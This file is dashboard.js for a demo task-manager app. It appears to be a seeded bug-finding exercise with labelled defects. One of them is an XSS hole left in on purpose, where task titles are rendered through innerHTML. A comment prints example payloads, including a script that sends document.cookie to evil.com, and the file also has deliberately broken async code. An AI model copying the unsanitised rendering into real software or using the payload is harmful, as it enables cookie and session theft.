/* =========================================================
   TaskFlow — dashboard.js
   Dashboard logic: tasks, modal, async fetch, XSS
   ========================================================= */

"use strict";

// ---- Auth guard ----
const currentUser = JSON.parse(localStorage.getItem("tf_user") || "null");
if (!currentUser) {
  window.location.href = "index.html";
}

// ---- Seed: initial task list ----
let tasks = JSON.parse(localStorage.getItem("tf_tasks") || "null") || [
  { id: 1, title: "Design new onboarding flow",  priority: "high",   done: false, assignee: "Sarah" },
  { id: 2, title: "Fix pagination bug in reports", priority: "medium", done: false, assignee: "James" },
  { id: 3, title: "Write unit tests for auth",    priority: "high",   done: false, assignee: "Admin" },
  { id: 4, title: "Update dependencies",           priority: "low",    done: true,  assignee: "Dev"   },
  { id: 5, title: "Code review: PR #42",          priority: "medium", done: false, assignee: "Sarah" },
];

let nextId = tasks.reduce((max, t) => Math.max(max, t.id), 0) + 1;

// ---- Utilities ----
function showToast(message, type = "info") {
  const container = document.getElementById("toastContainer");
  const toast = document.createElement("div");
  toast.className = `toast ${type}`;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 3500);
}

function saveTasks() {
  localStorage.setItem("tf_tasks", JSON.stringify(tasks));
}

function priorityBadge(priority) {
  const map = { high: "badge-high", medium: "badge-medium", low: "badge-low" };
  return `<span class="badge ${map[priority] || "badge-low"}">${priority}</span>`;
}

// ---- Update stats ----
function updateStats() {
  document.getElementById("statTotal").textContent   = tasks.length;
  document.getElementById("statDone").textContent    = tasks.filter(t => t.done).length;
  document.getElementById("statPending").textContent = tasks.filter(t => !t.done).length;
  document.getElementById("statHigh").textContent    = tasks.filter(t => t.priority === "high").length;
}

// ---- Render tasks ----
// [BUG-H1] XSS VULNERABILITY: task.title is rendered via innerHTML without sanitization.
// An attacker can create a task titled:
//   <img src=x onerror="alert('XSS: ' + document.cookie)">
// or even:
//   <script>fetch('https://evil.com?c='+document.cookie)</script>
// and it will execute in every user's browser who views the task list.
// Fix: use textContent, DOMPurify, or template literal escaping.
function renderTasks(list) {
  const container = document.getElementById("taskList");
  container.innerHTML = "";

  if (list.length === 0) {
    container.innerHTML = `<p class="text-muted" style="font-size:0.875rem;">No tasks found. Add one!</p>`;
    return;
  }

  list.forEach((task) => {
    const item = document.createElement("div");
    item.className = "task-item";

    // BUG H1 is on the next line — task.title injected directly into innerHTML
    item.innerHTML = `
      <input type="checkbox" class="task-checkbox" data-id="${task.id}" ${task.done ? "checked" : ""} />
      <span class="task-title ${task.done ? "done" : ""}">${task.title}</span>
      ${priorityBadge(task.priority)}
      <span class="task-meta">${task.assignee || "Unassigned"}</span>
      <button class="btn btn-danger btn-sm" data-delete="${task.id}">Delete</button>
    `;

    // Checkbox toggle
    item.querySelector(".task-checkbox").addEventListener("change", function () {
      const t = tasks.find(t => t.id === parseInt(this.dataset.id));
      if (t) { t.done = this.checked; saveTasks(); renderTasks(getFilteredTasks()); updateStats(); }
    });

    // Delete
    item.querySelector("[data-delete]").addEventListener("click", function () {
      tasks = tasks.filter(t => t.id !== parseInt(this.dataset.delete));
      saveTasks();
      renderTasks(getFilteredTasks());
      updateStats();
      showToast("Task deleted.", "error");
    });

    container.appendChild(item);
  });
}

function getFilteredTasks() {
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  return q ? tasks.filter(t => t.title.toLowerCase().includes(q)) : tasks;
}

// ---- Search ----
document.getElementById("searchInput").addEventListener("input", () => {
  renderTasks(getFilteredTasks());
});

// ---- Modal ----
const overlay   = document.getElementById("modalOverlay");
const modalClose = document.getElementById("modalClose");

document.getElementById("addTaskBtn").addEventListener("click", () => {
  overlay.classList.add("open");
});

modalClose.addEventListener("click", () => overlay.classList.remove("open"));
overlay.addEventListener("click", (e) => { if (e.target === overlay) overlay.classList.remove("open"); });

// ---- Add task form ----
document.getElementById("addTaskForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const title    = document.getElementById("taskTitle").value.trim();
  const priority = document.getElementById("taskPriority").value;
  const assignee = document.getElementById("taskAssignee").value.trim() || currentUser.name;

  if (!title) { showToast("Task title is required.", "error"); return; }

  tasks.push({ id: nextId++, title, priority, done: false, assignee });
  saveTasks();
  renderTasks(getFilteredTasks());
  updateStats();
  overlay.classList.remove("open");
  this.reset();
  showToast("Task created!", "success");
});

// ---- Async API fetch ----
// [BUG-H2] RACE CONDITION / missing await:
// The function is declared async but the fetch() call is NOT awaited.
// `data` is assigned the Promise object itself, not the resolved value.
// So `data` is always a pending Promise, and `data.tasks` is always `undefined`.
// The task list never renders. In some JS engines this also throws a
// "data.tasks is not iterable" TypeError silently caught by the catch block.
async function fetchRemoteTasks() {
  const container = document.getElementById("remoteTaskList");
  container.innerHTML = `<p class="text-muted" style="font-size:0.875rem;">Loading…</p>`;

  try {
    // Missing `await` before fetch — returns a Promise, not the response
    const response = fetch("https://jsonplaceholder.typicode.com/todos?_limit=5");

    // Also missing `await` before .json() — double async error
    const data = response.json();

    // `data` is a Promise here, so data.length === undefined
    if (!data || data.length === 0) {
      container.innerHTML = `<p class="text-muted" style="font-size:0.875rem;">No remote tasks found.</p>`;
      return;
    }

    container.innerHTML = "";
    data.forEach((todo) => {
      const item = document.createElement("div");
      item.className = "task-item";
      item.innerHTML = `
        <input type="checkbox" class="task-checkbox" ${todo.completed ? "checked" : ""} disabled />
        <span class="task-title ${todo.completed ? "done" : ""}">${todo.title}</span>
        <span class="badge badge-low">remote</span>
        <span class="task-meta">User #${todo.userId}</span>
      `;
      container.appendChild(item);
    });

  } catch (err) {
    container.innerHTML = `<p class="text-danger" style="font-size:0.875rem;">Failed to load remote tasks.</p>`;
    console.error("Fetch error:", err);
  }
}

document.getElementById("fetchTasksBtn").addEventListener("click", fetchRemoteTasks);

// ---- User info ----
if (currentUser) {
  document.getElementById("welcomeMsg").textContent  = `Hi, ${currentUser.name}`;
  document.getElementById("avatarBtn").textContent   = currentUser.name.charAt(0).toUpperCase();
}

// ---- Logout ----
document.getElementById("logoutBtn").addEventListener("click", () => {
  localStorage.removeItem("tf_user");
  localStorage.removeItem("tf_pass");
  localStorage.removeItem("tf_tasks");
  window.location.href = "index.html";
});

// ---- Init ----
renderTasks(tasks);
updateStats();
